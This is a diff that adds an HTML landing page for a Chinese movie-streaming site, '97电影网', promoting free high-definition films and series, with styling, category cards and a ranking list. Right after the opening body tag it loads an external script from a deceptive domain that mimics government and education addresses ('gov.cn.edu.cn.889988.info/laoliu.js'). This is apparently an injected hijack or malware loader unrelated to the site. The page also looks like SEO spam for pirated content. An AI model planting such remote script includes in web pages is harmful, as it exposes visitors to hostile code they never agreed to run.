@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="renderer" content="webkit">
+<title>97电影网 - 高清电影在线观看 | 97dianyingwang-h5</title>
+<meta name="description" content="97电影网(97dianyingwang-h5)提供海量高清电影、热播剧集、综艺动漫在线观看，支持手机电脑自适应访问，每日更新最新影视资源。">
+<meta name="keywords" content="97电影网, 97dianyingwang-h5, 高清电影, 在线观看, 热播剧集, 影视资源">
+<meta name="author" content="97电影网">
+<meta name="robots" content="index,follow">
+<meta name="copyright" content="97电影网">
+<link rel="canonical" href="https://97dianyingwang-h5">
+
+<style>
+:root{
+    --bg:#07070d;
+    --card:rgba(255,255,255,0.05);
+    --line:rgba(255,255,255,0.08);
+    --text:#e8e8f0;
+    --muted:#8b8ba7;
+    --accent:#7c5cff;
+    --accent2:#22d3ee;
+    --radius:16px;
+}
+*{margin:0;padding:0;box-sizing:border-box;font-family:"Microsoft YaHei","PingFang SC",-apple-system,Arial,sans-serif;}
+html{scroll-behavior:smooth;}
+body{
+    background:var(--bg);
+    color:var(--text);
+    line-height:1.7;
+    overflow-x:hidden;
+    /* 暗黑流光背景 */
+    background-image:
+        radial-gradient(circle at 15% 20%, rgba(124,92,255,0.18), transparent 40%),
+        radial-gradient(circle at 85% 60%, rgba(34,211,238,0.12), transparent 40%),
+        radial-gradient(circle at 50% 90%, rgba(255,92,168,0.10), transparent 45%);
+    background-attachment:fixed;
+}
+a{color:var(--accent2);text-decoration:none;transition:.25s;}
+ul{list-style:none;}
+
+/* 容器 */
+.wrap{width:92%;max-width:1180px;margin:0 auto;}
+
+/* 顶部通告 */
+.notice{
+    background:rgba(0,0,0,.55);
+    border-bottom:1px solid var(--line);
+    text-align:center;
+    font-size:13px;
+    color:var(--muted);
+    padding:8px 12px;
+    backdrop-filter:blur(8px);
+}
+.notice strong{color:var(--accent2);font-weight:600;}
+
+/* 头部 */
+header{
+    position:sticky;top:0;z-index:99;
+    background:rgba(7,7,13,.72);
+    backdrop-filter:blur(14px);
+    border-bottom:1px solid var(--line);
+}
+.header-inner{display:flex;align-items:center;justify-content:space-between;padding:14px 0;}
+.logo{font-size:26px;font-weight:900;letter-spacing:1px;background:linear-gradient(90deg,var(--accent),var(--accent2));-webkit-background-clip:text;background-clip:text;color:transparent;}
+.logo span{font-size:12px;display:block;letter-spacing:0;color:var(--muted);font-weight:400;-webkit-text-fill-color:var(--muted);margin-top:-2px;}
+.search{display:flex;align-items:center;gap:8px;}
+.search input{
+    padding:9px 16px;border-radius:30px;border:1px solid var(--line);
+    background:var(--card);color:var(--text);font-size:14px;width:200px;outline:none;
+}
+.search input:focus{border-color:var(--accent);}
+.search button{
+    padding:9px 20px;border:none;border-radius:30px;cursor:pointer;
+    background:linear-gradient(90deg,var(--accent),var(--accent2));color:#fff;font-weight:600;
+}
+
+/* 导航 */
+nav{background:rgba(0,0,0,.35);border-bottom:1px solid var(--line);}
+nav ul{display:flex;flex-wrap:wrap;gap:4px;}
+nav ul li a{
+    display:block;padding:12px 18px;color:var(--text);font-size:15px;font-weight:600;
+    border-bottom:2px solid transparent;
+}
+nav ul li a:hover{color:var(--accent2);border-bottom-color:var(--accent2);}
+
+/* Banner */
+.banner{
+    margin:30px 0 10px;border-radius:var(--radius);
+    padding:60px 40px;
+    background:
+        linear-gradient(120deg, rgba(124,92,255,.35), rgba(34,211,238,.20)),
+        repeating-linear-gradient(135deg, rgba(255,255,255,.03) 0 12px, transparent 12px 24px);
+    border:1px solid var(--line);
+    position:relative;overflow:hidden;
+}
+.banner h1{font-size:38px;font-weight:900;margin-bottom:14px;}
+.banner h1 em{font-style:normal;background:linear-gradient(90deg,#fff,var(--accent2));-webkit-background-clip:text;background-clip:text;color:transparent;}
+.banner p{color:var(--muted);max-width:640px;font-size:15px;}
+.banner .tags{margin-top:24px;display:flex;flex-wrap:wrap;gap:10px;}
+.banner .tags i{
+    font-style:normal;font-size:13px;padding:6px 16px;border-radius:30px;
+    background:rgba(255,255,255,.08);border:1px solid var(--line);color:var(--text);
+}
+
+/* 通用区块 */
+section{padding:50px 0;}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;margin-bottom:28px;gap:12px;flex-wrap:wrap;}
+.sec-head h2{font-size:24px;font-weight:800;position:relative;padding-left:14px;}
+.sec-head h2::before{content:"";position:absolute;left:0;top:4px;bottom:4px;width:5px;border-radius:4px;background:linear-gradient(var(--accent),var(--accent2));}
+.sec-head a{font-size:13px;color:var(--muted);}
+.sec-head a:hover{color:var(--accent2);}
+
+/* 玻璃卡片 */
+.grid{display:grid;gap:20px;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));}
+.card{
+    background:var(--card);border:1px solid var(--line);border-radius:var(--radius);
+    padding:24px;backdrop-filter:blur(10px);transition:.3s;position:relative;overflow:hidden;
+}
+.card::after{content:"";position:absolute;inset:0;border-radius:var(--radius);padding:1px;background:linear-gradient(135deg,var(--accent),transparent 60%);-webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);-webkit-mask-composite:xor;mask-composite:exclude;opacity:.35;pointer-events:none;}
+.card:hover{transform:translateY(-6px);background:rgba(255,255,255,.08);}
+.card .ico{font-size:30px;margin-bottom:14px;}
+.card h3{font-size:18px;margin-bottom:8px;}
+.card p{font-size:14px;color:var(--muted);}
+.card .more{display:inline-block;margin-top:14px;font-size:13px;color:var(--accent2);}
+
+/* 分类导航云 */
+.catbar{display:flex;flex-wrap:wrap;gap:10px;justify-content:center;margin-bottom:8px;}
+.catbar a{
+    padding:8px 20px;border-radius:30px;font-size:14px;font-weight:600;
+    background:var(--card);border:1px solid var(--line);color:var(--text);
+}
+.catbar a:hover{background:var(--accent);color:#fff;border-color:var(--accent);}
+
+/* 榜单表格 */
+.rank{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;}
+.rank li{display:flex;align-items:center;gap:16px;padding:14px 20px;border-bottom:1px solid var(--line);}
+.rank li:last-child{border-bottom:none;}
+.rank .num{width:28px;height:28px;flex:none;border-radius:8px;display:grid;place-items:center;font-weight:800;font-size:14px;background:rgba(255,255,255,.08);color:var(--muted);}
+.rank li:nth-child(1) .num{background:linear-gradient(135deg,#ff5e8a,#ff9a5e);color:#fff;}
+.rank li:nth-child(2) .num{background:linear-gradient(135deg,#7c5cff,#5c8bff);color:#fff;}
+.rank li:nth-child(3) .num{background:linear-gradient(135deg,#22d3ee,#5cffd0);color:#07070d;}
+.rank .ttl{flex:1;font-weight:600;}
+.rank .tag{font-size:12px;color:var(--muted);flex:none;}
+
+/* 数据条 */
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:16px;}
+.stat{text-align:center;padding:26px 16px;background:var(--card);border:1px solid var(--line);border-radius:var(--radius);}
+.stat b{display:block;font-size:30px;font-weight:900;background:linear-gradient(90deg,var(--accent),var(--accent2));-webkit-background-clip:text;background-clip:text;color:transparent;}
+.stat span{font-size:13px;color:var(--muted);}
+
+/* 关于 */
+.about{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:36px;}
+.about p{color:var(--muted);margin-bottom:14px;}
+.kw{display:flex;flex-wrap:wrap;gap:10px;margin-top:18px;}
+.kw i{font-style:normal;font-size:13px;padding:6px 14px;border-radius:8px;background:rgba(124,92,255,.15);color:#c9bdff;border:1px solid rgba(124,92,255,.3);}
+
+/* 页脚 */
+footer{background:rgba(0,0,0,.5);border-top:1px solid var(--line);padding:40px 0 24px;margin-top:30px;}
+.foot-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:30px;margin-bottom:30px;}
+.foot-col h4{font-size:15px;margin-bottom:14px;color:var(--accent2);}
+.foot-col a{display:block;color:var(--muted);font-size:13px;padding:4px 0;}
+.foot-col a:hover{color:var(--accent2);}
+.copy{text-align:center;color:var(--muted);font-size:13px;border-top:1px solid var(--line);padding-top:20px;}
+.copy a{color:var(--accent2);}
+
+/* 移动端 */
+@media(max-width:768px){
+    .search input{width:130px;}
+    .logo{font-size:20px;}
+    .banner{padding:40px 22px;}
+    .banner h1{font-size:26px;}
+    .sec-head h2{font-size:20px;}
+    nav ul{overflow-x:auto;flex-wrap:nowrap;-webkit-overflow-scrolling:touch;}
+    nav ul li a{white-space:nowrap;padding:12px 14px;}
+    section{padding:36px 0;}
+}
+@media(max-width:480px){
+    .header-inner{flex-wrap:wrap;gap:10px;}
+    .search{width:100%;}
+    .search input{flex:1;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="notice">
+    本站官方唯一网址：<strong>https://97dianyingwang-h5</strong>　请认准 97电影网 正版入口
+</div>
+
+<header>
+    <div class="wrap header-inner">
+        <div class="logo">97电影网<span>97dianyingwang-h5</span></div>
+        <div class="search">
+            <input type="text" placeholder="搜索电影 / 剧名 / 演员">
+            <button>搜索</button>
+        </div>
+    </div>
+</header>
+
+<nav>
+    <div class="wrap">
+        <ul>
+            <li><a href="#home">首页</a></li>
+            <li><a href="#movie">电影频道</a></li>
+            <li><a href="#tv">电视剧</a></li>
+            <li><a href="#rank">热播榜单</a></li>
+            <li><a href="#about">关于我们</a></li>
+        </ul>
+    </div>
+</nav>
+
+<!-- 首页 Banner -->
+<section id="home" style="padding-bottom:0;">
+    <div class="wrap">
+        <div class="banner">
+            <h1>欢迎来到 <em>97电影网</em></h1>
+            <p>97电影网（97dianyingwang-h5）专注高清影视在线观看，海量电影、热播剧集、综艺动漫每日更新，支持手机、平板、电脑自适应访问，随时随地畅享精彩。</p>
+            <div class="tags">
+                <i># 高清在线</i><i># 每日更新</i><i># 手机畅看</i><i># 免费资源</i><i># 极速加载</i>
+            </div>
+        </div>
+
+        <div class="catbar" style="margin-top:30px;">
+            <a href="#">动作</a><a href="#">喜剧</a><a href="#">爱情</a><a href="#">科幻</a>
+            <a href="#">悬疑</a><a href="#">恐怖</a><a href="#">动漫</a><a href="#">综艺</a>
+            <a href="#">国产剧</a><a href="#">美剧</a><a href="#">韩剧</a><a href="#">纪录片</a>
+        </div>
+    </div>
+</section>
+
+<!-- 电影频道 -->
+<section id="movie">
+    <div class="wrap">
+        <div class="sec-head">
+            <h2>电影频道</h2>
+            <a href="#">查看更多 ›</a>
+        </div>
+        <div class="grid">
+            <div class="card">
+                <div class="ico">🎬</div>
+                <h3>动作大片</h3>
+                <p>院线动作巨制、经典功夫片，热血震撼，视效拉满。</p>
+                <a href="#" class="more">立即观看 ›</a>
+            </div>
+            <div class="card">
+                <div class="ico">💖</div>
+                <h3>爱情喜剧</h3>
+                <p>轻松浪漫的爱情故事与爆笑喜剧，治愈每一个夜晚。</p>
+                <a href="#" class="more">立即观看 ›</a>
+            </div>
+            <div class="card">
+                <div class="ico">🚀</div>
+                <h3>科幻悬疑</h3>
+                <p>烧脑剧情、时空穿梭、硬核科幻，挑战你的想象力。</p>
+                <a href="#" class="more">立即观看 ›</a>
+            </div>
+            <div class="card">
+                <div class="ico">👻</div>
+                <h3>恐怖惊悚</h3>
+                <p>高能惊悚、悬疑推理，胆量挑战专区。</p>
+                <a href="#" class="more">立即观看 ›</a>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 电视剧 -->
+<section id="tv">
+    <div class="wrap">
+        <div class="sec-head">
+            <h2>热播剧集</h2>
+            <a href="#">查看更多 ›</a>
+        </div>
+        <div class="grid">
+            <div class="card">
+                <div class="ico">🇨🇳</div>
+                <h3>国产剧</h3>
+                <p>热门国产电视剧同步更新，正剧、古装、都市全覆盖。</p>
+                <a href="#" class="more">立即播放 ›</a>
+            </div>
+            <div class="card">
+                <div class="ico">🌏</div>
+                <h3>美剧韩剧</h3>
+                <p>海外热剧中文翻译同步上线，追剧不等待。</p>
+                <a href="#" class="more">立即播放 ›</a>
+            </div>
+            <div class="card">
+                <div class="ico">📺</div>
+                <h3>网络短剧</h3>
+                <p>碎片化时间必备，轻松短剧一看就停不下来。</p>
+                <a href="#" class="more">立即播放 ›</a>
+            </div>
+            <div class="card">
+                <div class="ico">🎞️</div>
+                <h3>综艺动漫</h3>
+                <p>热门综艺、经典动漫、纪录片一站集齐。</p>
+                <a href="#" class="more">立即播放 ›</a>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 热播榜单 -->
+<section id="rank">
+    <div class="wrap">
+        <div class="sec-head">
+            <h2>热播榜单</h2>
+            <a href="#">完整榜单 ›</a>
+        </div>
+        <ul class="rank">
+            <li><span class="num">1</span><span class="ttl">热辣滚烫：逆转人生</span><span class="tag">动作 · 9.2</span></li>
+            <li><span class="num">2</span><span class="ttl">星际回响</span><span class="tag">科幻 · 8.9</span></li>
+            <li><span class="num">3</span><span class="ttl">长安迷案</span><span class="tag">悬疑 · 8.7</span></li>
+            <li><span class="num">4</span><span class="ttl">恋恋不忘</span><span class="tag">爱情 · 8.5</span></li>
+            <li><span class="num">5</span><span class="ttl">铁拳无敌</span><span class="tag">动作 · 8.4</span></li>
+            <li><span class="num">6</span><span class="ttl">深夜食堂·重逢篇</span><span class="tag">剧情 · 8.3</span></li>
+            <li><span class="num">7</span><span class="ttl">幻境迷宫</span><span class="tag">惊悚 · 8.1</span></li>
+            <li><span class="num">8</span><span class="ttl">云端恋人</span><span class="tag">喜剧 · 7.9</span></li>
+        </ul>
+    </div>
+</section>
+
+<!-- 数据统计 -->
+<section>
+    <div class="wrap">
+        <div class="stats">
+            <div class="stat"><b>10万+</b><span>影视资源</span></div>
+            <div class="stat"><b>4K</b><span>超清画质</span></div>
+            <div class="stat"><b>1秒</b><span>极速打开</span></div>
+            <div class="stat"><b>365天</b><span>每日更新</span></div>
+        </div>
+    </div>
+</section>
+
+<!-- 关于我们 -->
+<section id="about">
+    <div class="wrap">
+        <div class="about">
+            <div class="sec-head" style="margin-bottom:20px;"><h2>关于 97电影网</h2></div>
+            <p>97电影网（https://97dianyingwang-h5）致力于打造一个简洁、稳定、高速的影视在线观看平台。网站采用自适应设计，兼容手机、平板、电脑，让用户随时随地享受高清影视内容。</p>
+            <p>我们持续更新电影、电视剧、综艺、动漫等多种类型资源，涵盖动作、喜剧、爱情、科幻、悬疑、恐怖等全部分类，满足不同用户的观影需求。</p>
+            <div class="kw">
+                <i>97电影网</i><i>97dianyingwang-h5</i><i>高清电影在线观看</i><i>热播剧集</i><i>免费影视资源</i><i>手机电影网站</i>
+            </div>
+        </div>
+    </div>
+</section>
+
+<footer>
+    <div class="wrap">
+        <div class="foot-grid">
+            <div class="foot-col">
+                <h4>97电影网</h4>
+                <a href="#home">网站首页</a>
+                <a href="#about">关于我们</a>
+                <a href="#">官方网址：https://97dianyingwang-h5</a>
+            </div>
+            <div class="foot-col">
+                <h4>电影分类</h4>
+                <a href="#">动作大片</a><a href="#">爱情喜剧</a><a href="#">科幻悬疑</a><a href="#">恐怖惊悚</a>
+            </div>
+            <div class="foot-col">
+                <h4>电视剧集</h4>
+                <a href="#">国产剧</a><a href="#">美剧韩剧</a><a href="#">网络短剧</a><a href="#">综艺动漫</a>
+            </div>
+            <div class="foot-col">
+                <h4>快捷入口</h4>
+                <a href="#">搜索影片</a><a href="#">热播榜单</a><a href="#">最新更新</a><a href="#">全部分类</a>
+            </div>
+        </div>
+        <div class="copy">
+            © 2026 97电影网（97dianyingwang-h5）· 网站官方地址：<a href="https://97dianyingwang-h5">https://97dianyingwang-h5</a><br>
+            本站仅提供影视信息展示服务，所有内容均来自互联网公开资源
+        </div>
+    </div>
+</footer>
+
+</body>
+</html>
